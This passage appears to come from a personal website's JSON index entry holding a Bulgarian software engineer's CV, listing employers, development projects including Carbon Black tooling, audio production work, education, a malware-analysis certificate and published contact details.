Java]\nProjects:\nThreat Intelligence Connector for Carbon Black Cloud (https://github.com/carbonblack/carbon-black-cloud-threat-intelligence-connector) - Main Developer and Maintainer VMware Carbon Black Cloud Python SDK (https://github.com/carbonblack/carbon-black-cloud-sdk-python) - Developer and Maintainer And other closed-source projects.\nADataPro (Software Engineer) \u0026gt; 2019-06 - 2021-09\nLanaguages: [JavaScript, Python]\nManaging the infrastructure, leading an architectural decisions, mentoring.\nProjects:\nMedia Listening Platform - Platform for media listening and tracking AI Media Intelligence Solution for TV/Radio - Cutting the cost for the company by 20x by implementing my idea for a Media Intelligence Listening Service - Sole Developer and Maintainer Crawling Solutions for various Websites - Created crawling solutions for numerous websites. - Developer And other numerous ETL scripts and SDKs.\nNexGen LTD (Software Engineer) \u0026gt; 2018-10 - 2019-04\nLanguages: [PHP, JavaScript]\nProjects:\nIntraPricing Solution (https://intrapricing.com/) - Maintaining the system Harzreisen (https://harzreisen.de/) - Created the most of the frontend and the backend for the platform also including the admin panel. JSoft (Software Engineer) \u0026gt; 2016-11 - 2017-03\nLanguages: [PHP, JavaScript]\nProjects:\nProperty Management System - Developed a Property Management System with a small team of developers Audio Producing Experience Full Length Productions / Sound Design - AudioJungle (Audio Producer / Sound Designer) \u0026gt; 2017 - Present Full Length Productions / Sound Design - Shutterstock Music (Audio Producer / Sound Designer) \u0026gt; 2016 - Present Education Burgas Free University (Computer Science - Masters) - Bulgaria \u0026gt; 2020 - 2021 | Dropped TU Chemnitz (Software Engineering - Masters) - Germany \u0026gt; 2018 - 2019 Burgas Free University (Computer Science - Bachelor) - Bulgaria \u0026gt; 2015 - 2019 Certificates / Languages TCM Security - Practical Malware Analysis \u0026amp; Triage English CERF - C1 German - Deutsch für die technischen Fächer - B2/B1 Udemy [UC-CY7BEGYO, UC-0WC1CNGU] Contact You can reach me on my e-mail: dganev@pm.me or by a phone +(359) 88 976 1722\n","permalink":"https://sy1.sh/cv/","summary":"Download PDF\nMy name is Dimitar Ganev and I am a software engineer interested in cyber security, malware development and malware analysis. Areas of expertise/interest include Python, Go, PowerShell, Building Pipelines, Debugging and Profiling. I am located in Bulgaria and I have worked as a remote engineer since 2019.\nIn my spare time I am frequently researching various topics such as cyber secuirty topics, reverse engineering, game hacking/cheating (only for educational purposes).","title":"CV"}]